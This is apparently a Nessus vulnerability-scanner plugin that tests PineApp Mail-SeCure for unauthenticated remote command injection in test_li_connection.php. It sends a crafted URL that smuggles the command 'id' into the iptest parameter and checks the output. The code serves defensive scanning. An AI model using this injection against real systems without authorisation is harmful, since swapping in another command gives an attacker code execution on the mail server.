#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69178);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/02/08 22:04:50 $");

  script_bugtraq_id(61477);
  script_osvdb_id(95782);

  script_name(english:"PineApp Mail-SeCure test_li_connection.php Remote Command Injection");
  script_summary(english:"Tries to execute an arbitrary command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is affected by a
remote command injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of PineApp Mail-SeCure installed on the remote host is
affected by a remote command injection vulnerability because the
application fails to properly sanitize input to the
'test_li_connection.php' script.  This could allow a remote,
unauthenticated attacker to execute arbitrary commands on the remote
host by sending a specially crafted URL. 

Note that this application is reportedly also affected by several
additional remote command execution vulnerabilities; however, Nessus has
not tested for these."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-188/");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"PineApp Mail-SeCure 3.70 test_li_connection.php RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PineApp Mail-SeCure test_li_connection.php Arbitrary Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/07/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pineapp:mail-secure");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("pineapp_mail_secure_detect.nasl");
  script_require_ports("Services/www", 7080, 7443);
  script_require_keys("www/pineapp_mailsecure");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:7080);

install = get_install_from_kb(
  appname      : "pineapp_mailsecure",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

idtest = rand() % 9999;
url = "/admin/test_li_connection.php?actiontest=1&idtest=" + idtest +
  "&iptest=127.0.0.1;" + cmd;

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + url,
  exit_on_fail : TRUE
);
if (egrep(pattern:cmd_pat, string:res[2]))
{
  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    header =
      '\nNessus was able to execute the command "' + cmd + '" on the remote' +
      'host' + '\nusing the following URL';
    trailer = '';
    if (report_verbosity > 1)
    {
      trailer +=
        '\nThis produced the following output :' +
        '\n' + snip +
        '\n' + chomp(res[2]) +
        '\n' + snip + '\n';
    }
    report = get_vuln_report(
      items   : dir + url,
      port    : port,
      header  : header,
      trailer : trailer
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "PineApp Mail-SeCure", build_url(qs:dir, port:port));
